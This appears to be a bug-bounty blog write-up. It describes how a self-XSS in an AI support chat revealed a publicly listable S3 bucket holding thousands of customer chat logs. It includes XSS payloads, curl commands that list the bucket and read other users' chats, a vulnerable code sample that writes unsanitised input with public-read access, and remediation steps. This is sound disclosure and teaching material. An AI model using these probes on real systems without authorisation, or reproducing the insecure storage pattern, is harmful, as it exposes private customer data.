---
layout: post
title: "Self-XSS Reveals S3 Bucket Domain - 12K+ Chat Sessions Exposed"
date: 2024-03-09
tags: [Web, XSS, High, S3]
excerpt: "A self-XSS in an AI support chat led me to test document.domain, which unexpectedly revealed an S3 bucket. This discovery exposed 12.000+ customer conversations stored in a publicly accessible bucket."
---

A self-XSS in an AI support chat led me to test `document.domain`, which unexpectedly revealed an S3 bucket. This discovery exposed 12.000+ customer conversations stored in a publicly accessible bucket.

---

## Discovery: Self-XSS Opens the Door

I was testing the support chat feature on `app.company.com` for input validation issues. First, I tried a basic XSS payload:

```html
<script>alert(1)</script>
```

Success! The payload executed. But this was just self-XSS—only affecting my own session. Usually a low-severity finding.

However, I wanted to understand the execution context better, so I tested:

```html
<script>alert(document.domain)</script>
```

The popup showed something unexpected:

```
Expected: "app.company.com"
Got: "prod-xxxx.customer-chats.s3.amazonaws.com"
```

<div align="center">
    <img src="https://i.pinimg.com/736x/da/ef/e4/daefe4a61442bcbd656e3f13adfae32e.jpg" 
         alt="S3 Domain Revealed" 
         style="width: 300px; height: auto;">
</div>
Wait... an S3 bucket domain? 🤔

**This changed everything.** The self-XSS revealed that my code wasn't executing on the main application—it was running in a different context entirely.

---

## Investigation: Hidden Iframe

I inspected the page source and found a hidden iframe:

```html
<iframe id="chat-frame" 
        src="https://prod-xxxx.customer-chats.s3.amazonaws.com/sessions/chat-abc123.html"
        style="width:100%; height:500px; border:none;">
</iframe>
```

The architecture became clear:
1. User sends message → Backend saves to S3 as HTML file
2. Frontend loads the S3 URL in an iframe
3. Chat content renders from S3 bucket
4. **My XSS executed inside the iframe** → That's why `document.domain` showed S3

---

## Testing the S3 Bucket

Now that I had the exact bucket URL, I tested if it was properly secured:

```bash
curl https://prod-xxxx.customer-chats.s3.amazonaws.com/
```

**Result**: Full bucket listing returned.

```xml
<ListBucketResult>
    <n>customer-chats</n>
    <Contents>
        <Key>sessions/chat-2024-01-15-abc123.html</Key>
        <Key>sessions/chat-2024-01-15-def456.html</Key>
        <Key>sessions/chat-2024-01-15-xyz789.html</Key>
        <!-- ... continues for 15,847 total files ... -->
    </Contents>
</ListBucketResult>
```

I tested accessing another user's chat session:

```bash
curl https://prod-xxxx.customer-chats.s3.amazonaws.com/sessions/chat-2024-01-15-xyz789.html
```

Full access confirmed. Any chat session could be read without authentication.

---

## What Was Exposed

The bucket contained **15,847 chat session files**. I checked a few random samples to understand the data sensitivity:

**Sample 1 (chat-2024-01-15-xyz789.html):**
```html
<div class="message">
    <p>Hi, my email is john.doe@company.com and I need help with order #12345</p>
</div>
<div class="message">
    <p>My phone is +1-555-123-4567</p>
</div>
```

**Sample 2 (chat-2024-01-14-abc456.html):**
```html
<div class="message">
    <p>Here's my API key for debugging: sk_live_abc123xyz789...</p>
</div>
<div class="message">
    <p>My card ending in 4532 was charged twice</p>
</div>
```

From the samples reviewed, chats contained:
- Customer names and email addresses
- Phone numbers
- Order details and account information
- API keys shared for troubleshooting
- Credit card last 4 digits mentioned in support issues
- Internal support agent notes

The bucket listing showed files dating back several months.

---

## Attack Flow

```
1. Test for XSS → Found self-XSS (Low severity)
2. Test document.domain → Reveals S3 bucket domain
3. Inspect page → Found hidden iframe loading from S3
4. Extract S3 bucket URL from iframe source
5. Test bucket access → Public listing enabled
6. Access other chat sessions → Confirmed data exposure
7. Report finding (High severity)
```

---

## Root Cause

**Backend implementation:**
```javascript
// Vulnerable: Saves chat to PUBLIC S3
await s3.putObject({
    Bucket: 'customer-chats',
    Key: `sessions/chat-${sessionId}.html`,
    Body: `<div>${userMessage}</div>`, // No sanitization
    ACL: 'public-read' // Anyone can read
});
```

**Misconfigured bucket policy:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": [
      "arn:aws:s3:::customer-chats",
      "arn:aws:s3:::customer-chats/*"
    ]
  }]
}
```

---

## Timeline

| Day | Event |
|-----|-------|
| **1** | Found self-XSS, tested `document.domain` |
| **1** | Discovered S3 bucket, tested access |
| **1** | Reviewed samples, documented scope |
| **1** | Reported as High severity |
| **2** | Bucket access restricted |
| **3** | Data migrated to secure storage |
| **30** | Report resolved, bounty awarded |

---

## Remediation

**Immediate fix:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Principal": "*",
    "Action": ["s3:ListBucket", "s3:GetObject"],
    "Resource": [
      "arn:aws:s3:::customer-chats",
      "arn:aws:s3:::customer-chats/*"
    ]
  }]
}
```

**Long-term improvements:**
- Removed iframe-based architecture
- Migrated chat storage to database
- Implemented input sanitization (DOMPurify)
- If S3 needed, use pre-signed URLs with short expiry
- Enabled S3 Block Public Access at account level
- Added Content Security Policy headers

---

## Key Lessons

### 1. Self-XSS Can Be Your Entry Point

Don't immediately dismiss self-XSS findings. They can reveal deeper architectural issues. Always test execution context:

```html
<!-- Step 1: Confirm XSS -->
<script>alert(1)</script>

<!-- Step 2: Check execution context -->
<script>alert(document.domain)</script>
```

If `document.domain` shows an unexpected domain, investigate further.

### 2. Test S3 Buckets When Discovered

When you find S3 URLs, always test:

```bash
# Test bucket listing
curl https://bucket-name.s3.amazonaws.com/

# Test different regions if needed
curl https://bucket-name.s3.us-west-2.amazonaws.com/
```

### 3. Chain Low Findings to High Impact

```
Self-XSS (Low)
  → Test document.domain (Investigation)
  → Discover hidden iframe (Info)
  → Extract S3 URL (Info)
  → Test bucket access (High)
```

### 4. One Extra Test Makes the Difference

Without testing `document.domain`, I would have reported a low-severity self-XSS and moved on. That single additional test transformed the finding from Low to High severity.

---

## Impact Assessment

**CVSS Score**: 7.5 (High)

**Attack Vector**: Network (AV:N)  
**Attack Complexity**: Low (AC:L)  
**Privileges Required**: None (PR:N)  
**User Interaction**: None (UI:N)  
**Scope**: Unchanged (S:U)  
**Confidentiality**: High (C:H)  
**Integrity**: None (I:N)  
**Availability**: None (A:N)

**Business Impact**:
- 12.000+ private customer conversations exposed
- Customer PII accessible without authentication
- API keys and sensitive data leaked in conversations
- Long-term exposure (months of data)
- Simple curl command to exploit
- Potential regulatory violations (GDPR, etc.)

---

## References

- [AWS S3 Security Best Practices](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
- [OWASP: Cross-Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [S3 Bucket Permissions](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-overview.html)

---

**The turning point was a simple test.**

Without testing `document.domain`, this would have been reported as low-severity self-XSS. One additional payload transformed it into a High-severity data exposure affecting thousands of users.

**Key takeaway**: When you find self-XSS, always test `document.domain`. An unexpected domain means there's more to investigate.